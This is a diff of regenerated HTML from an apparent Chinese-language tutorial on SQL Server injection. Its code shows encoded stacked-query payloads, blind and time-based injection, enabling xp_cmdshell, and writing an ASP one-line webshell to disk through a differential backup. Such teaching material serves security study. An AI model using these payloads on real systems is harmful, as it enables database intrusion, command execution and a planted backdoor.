class="mi">101</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">118</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">44</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">118</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">41</span><span class="p">)</span><span class="w"> </span><span class="k">exec</span><span class="p">(</span><span class="o">@</span><span class="n">s</span><span class="p">)</span><span class="c1">--
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">s</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="o">@</span><span class="n">s</span><span class="o">=</span><span class="mi">0</span><span class="n">x73656c65637420636f6e7665727428696e742c404076657273696f6e29</span><span class="w"> </span><span class="k">exec</span><span class="p">(</span><span class="o">@</span><span class="n">s</span><span class="p">)</span><span class="c1">--
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">s</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="o">@</span><span class="n">s</span><span class="o">=</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">118</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">44</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">118</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">41</span><span class="p">)</span><span class="w"> </span><span class="k">exec</span><span class="p">(</span><span class="o">@</span><span class="n">s</span><span class="p">)</span><span class="c1">--
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="42-盲注">4.2 盲注</h3>
 <p>其实跟 mysql 大同小异无非就是分割字符串比较，但是 mssql 的盲注套路确实没那么多。</p>
@@ -629,8 +629,8 @@ SOME    如果在一组比较中，有些比较为 true，那么结果为 true
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="k">substring</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">109</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="k">substring</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">109</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="422-时间盲注">4.2.2 时间盲注</h4>
 <div class="highlight"><div class="chroma">
@@ -640,10 +640,10 @@ SOME    如果在一组比较中，有些比较为 true，那么结果为 true
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">))</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">WAITFOR</span><span class="w"> </span><span class="n">DELAY</span><span class="w"> </span><span class="s1">&#39;0:0:5&#39;</span><span class="c1">--
-</span><span class="c1"></span><span class="w">
-</span><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="k">substring</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">1</span><span class="w"> </span><span class="n">WAITFOR</span><span class="w"> </span><span class="n">DELAY</span><span class="w"> </span><span class="s1">&#39;0:0:5&#39;</span><span class="c1">--
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">))</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">WAITFOR</span><span class="w"> </span><span class="n">DELAY</span><span class="w"> </span><span class="s1">&#39;0:0:5&#39;</span><span class="c1">--
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="k">substring</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">1</span><span class="w"> </span><span class="n">WAITFOR</span><span class="w"> </span><span class="n">DELAY</span><span class="w"> </span><span class="s1">&#39;0:0:5&#39;</span><span class="c1">--
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="42-联合注入">4.2 联合注入</h3>
 <p>mssql 联合注入我们一般不使用数字占位，而是 null，因为使用数字占位可能会发生隐式转换</p>
@@ -694,10 +694,10 @@ SOME    如果在一组比较中，有些比较为 true，那么结果为 true
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">execute</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;c:&#39;</span><span class="w">       </span><span class="o">//</span><span class="err">列出所有</span><span class="w"> </span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="w"> </span><span class="err">文件和目录</span><span class="p">,</span><span class="err">子目录</span><span class="w"> 
-</span><span class="w"></span><span class="k">execute</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;c:&#39;</span><span class="p">,</span><span class="mi">1</span><span class="w">     </span><span class="o">//</span><span class="err">只列</span><span class="w"> </span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="w"> </span><span class="err">文件夹</span><span class="w"> 
-</span><span class="w"></span><span class="k">execute</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;c:&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="w">   </span><span class="o">//</span><span class="err">列</span><span class="w"> </span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="w"> </span><span class="err">文件夹加文件</span><span class="w"> 
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">execute</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;c:&#39;</span><span class="w">       </span><span class="o">//</span><span class="err">列出所有</span><span class="w"> </span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="w"> </span><span class="err">文件和目录</span><span class="p">,</span><span class="err">子目录</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">execute</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;c:&#39;</span><span class="p">,</span><span class="mi">1</span><span class="w">     </span><span class="o">//</span><span class="err">只列</span><span class="w"> </span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="w"> </span><span class="err">文件夹</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">execute</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;c:&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="w">   </span><span class="o">//</span><span class="err">列</span><span class="w"> </span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="w"> </span><span class="err">文件夹加文件</span><span class="w"> 
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>通过执行 <code>xp_dirtree</code> 返回我们传入的参数，如果没有回显的话，可以这样创建一个临时的表插入</p>
 <div class="highlight"><div class="chroma">
@@ -707,10 +707,10 @@ SOME    如果在一组比较中，有些比较为 true，那么结果为 true
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">tmp</span><span class="w"> </span><span class="p">(</span><span class="n">dir</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">8000</span><span class="p">),</span><span class="n">num</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span><span class="n">num1</span><span class="w"> </span><span class="nb">int</span><span class="p">);</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">tmp</span><span class="p">(</span><span class="n">dir</span><span class="p">,</span><span class="n">num</span><span class="p">,</span><span class="n">num1</span><span class="p">)</span><span class="w"> </span><span class="k">execute</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;c:&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">tmp</span><span class="w"> </span><span class="p">(</span><span class="n">dir</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">8000</span><span class="p">),</span><span class="n">num</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span><span class="n">num1</span><span class="w"> </span><span class="nb">int</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">tmp</span><span class="p">(</span><span class="n">dir</span><span class="p">,</span><span class="n">num</span><span class="p">,</span><span class="n">num1</span><span class="p">)</span><span class="w"> </span><span class="k">execute</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;c:&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>xp_cmdshell</code> 寻找路径：</p>
 <p>这个 <code>xp_cmdshell</code> 找起来更加方便我们调用cmd的命令去搜索，比如我的web目录有个1.aspx</p>
@@ -720,9 +720,9 @@ SOME    如果在一组比较中，有些比较为 true，那么结果为 true
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\U</span>sers<span class="se">\G</span>ee&gt;for /r c:<span class="se">\ </span>%i in <span class="o">(</span>1*.aspx<span class="o">)</span> <span class="k">do</span> @echo %i
-c:<span class="se">\w</span>ww<span class="se">\1</span>.aspx
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\G</span>ee&gt;for /r c:<span class="se">\ </span>%i in <span class="o">(</span>1*.aspx<span class="o">)</span> <span class="k">do</span> @echo %i
+</span></span><span class="line"><span class="cl">c:<span class="se">\w</span>ww<span class="se">\1</span>.aspx
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>所以只需要建立一个表，存在一个 char 字段就可以了。</p>
 <div class="highlight"><div class="chroma">
@@ -732,10 +732,10 @@ c:<span class="se">\w</span>ww<span class="se">\1</span>.aspx
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">cmdtmp</span><span class="w"> </span><span class="p">(</span><span class="n">dir</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">8000</span><span class="p">));</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">cmdtmp</span><span class="p">(</span><span class="n">dir</span><span class="p">)</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;for /r c:\ %i in (1*.aspx) do @echo %i&#39;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">cmdtmp</span><span class="w"> </span><span class="p">(</span><span class="n">dir</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">8000</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">cmdtmp</span><span class="p">(</span><span class="n">dir</span><span class="p">)</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;for /r c:\ %i in (1*.aspx) do @echo %i&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><div class="details admonition info open">
         <div class="details-summary admonition-title">
@@ -753,12 +753,12 @@ c:<span class="se">\w</span>ww<span class="se">\1</span>.aspx
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">// 允许修改高级参数 
-;EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;
-
-// 打开xp_cmdshell 扩展
-;EXEC sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;--
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 允许修改高级参数 
+</span></span><span class="line"><span class="cl">;EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 打开xp_cmdshell 扩展
+</span></span><span class="line"><span class="cl">;EXEC sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;--
+</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
         </div>
@@ -778,17 +778,17 @@ c:<span class="se">\w</span>ww<span class="se">\1</span>.aspx
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">//</span><span class="w"> </span><span class="err">完整备份一次</span><span class="p">(</span><span class="err">保存位置可以改</span><span class="p">)</span><span class="w">
-</span><span class="w"></span><span class="n">backup</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">disk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;c:\bak.bak&#39;</span><span class="p">;</span><span class="c1">--
-</span><span class="c1"></span><span class="w">
-</span><span class="w"></span><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="p">[</span><span class="n">dbo</span><span class="p">].[</span><span class="n">test</span><span class="p">]</span><span class="w"> </span><span class="p">([</span><span class="n">cmd</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">image</span><span class="p">]);</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">创建表</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="err">并插入一句话木马</span><span class="w">
-</span><span class="w"></span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">test</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="p">(</span><span class="mi">0</span><span class="n">x3C25657865637574652872657175657374282261222929253E</span><span class="p">)</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">进行差异备份</span><span class="w">
-</span><span class="w"></span><span class="n">backup</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">disk</span><span class="o">=</span><span class="s1">&#39;C:\d.asp&#39;</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="n">DIFFERENTIAL</span><span class="p">,</span><span class="n">FORMAT</span><span class="p">;</span><span class="c1">--
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">//</span><span class="w"> </span><span class="err">完整备份一次</span><span class="p">(</span><span class="err">保存位置可以改</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">backup</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">disk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;c:\bak.bak&#39;</span><span class="p">;</span><span class="c1">--
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="p">[</span><span class="n">dbo</span><span class="p">].[</span><span class="n">test</span><span class="p">]</span><span class="w"> </span><span class="p">([</span><span class="n">cmd</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">image</span><span class="p">]);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">创建表</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="err">并插入一句话木马</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">test</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="p">(</span><span class="mi">0</span><span class="n">x3C25657865637574652872657175657374282261222929253E</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">进行差异备份</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">backup</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">disk</span><span class="o">=</span><span class="s1">&#39;C:\d.asp&#39;</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="n">DIFFERENTIAL</span><span class="p">,</span><span class="n">FORMAT</span><span class="p">;</span><span class="c1">--
+</span></span></span></code></pre></td></tr></table>
 </div>
